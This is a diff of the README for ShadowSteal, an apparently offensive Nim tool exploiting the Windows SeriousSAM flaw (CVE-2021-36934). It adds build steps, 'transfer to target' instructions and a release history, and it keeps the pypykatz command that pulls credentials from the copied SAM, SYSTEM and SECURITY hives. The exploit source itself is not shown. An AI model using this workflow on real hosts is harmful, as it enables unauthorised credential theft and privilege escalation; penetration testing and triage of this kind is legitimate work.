@@ -1,6 +1,28 @@
 # ShadowSteal | CVE-2021-36934
-###  v.02 | THE JEFF BEEZY UPDATE
 Pure Nim implementation for exploiting CVE-2021-36934, the SeriousSAM Local Privilege Escalation (LPE). Nothing fancy, basically just a wrapper for PowerShell copy, but does save some time if you're triaging vulnerable hosts. Not OPSEC safe.... yet ;). I do not claim credit for the discovery of this exploit.
+
+## Quick Start
+```
+$ sudo apt-get install nim
+```
+```
+$ nimble install zippy argparse
+```
+
+Install the MinGW tool chain if it's not already installed.
+```
+$ sudo apt-get install mingw-w64
+```
+```
+git clone https://github.com/HuskyHacks/ShadowSteal.git && cd ShadowSteal
+```
+```
+$ make && cd bin/ && ls -l
+```
+Transfer to target...
+```
+PS C:\Users\husky\Desktop> .\ShadowSteal.exe -h
+```
 
 ## Summary
 Due to some oversight by Microsoft, regular users have read permissions over the contents of the ...\System32\config\ folder in recent Windows builds. Among other things, this means that a low level user has read access to the SAM, System, and Security files in ...\System32\config.
@@ -51,8 +73,9 @@ $ sudo apt-get install mingw-w64
 
 Compile for 64-bit Windows:
 ```
-$ nim c --d:mingw --cpu=amd64 --app=console ShadowSteal.nim
+$ make
 ```
+
 Transfer to target and run it!
 ## Usage
 
@@ -83,6 +106,21 @@ To run Pypykatz:
 $ pypykatz registry [yyyyMMddhhmm_SYSTEM] --sam [yyyyMMddhhmm_SAM] --security [yyyyMMddhhmm_SECURITY]
 ```
 ![5.png](img/5.png)
+
+## Release History
+
+###  v.03.69 | the N I C E update
+Lean and mean.  Compress all shadow files that exist. Optimized compile options added. Huge thanks to @orbitalgun for the pseudo PR!
+
+### v.02 THE JEFF BEEZY UPDATE
+- Bruteforce and Triage mode
+- A better search algo
+- Code cleanup
+- Jeff Beezy Mode
+- Lots of lessons learned from the first release!
+
+### v.01 THE LAUNCHPAD RELEASE
+Stap in boiz, this trainwreck is a-rollin. This release was my rapid prototype and it was pretty terrible lol. Lots of fun to build though!
 
 ## References
 
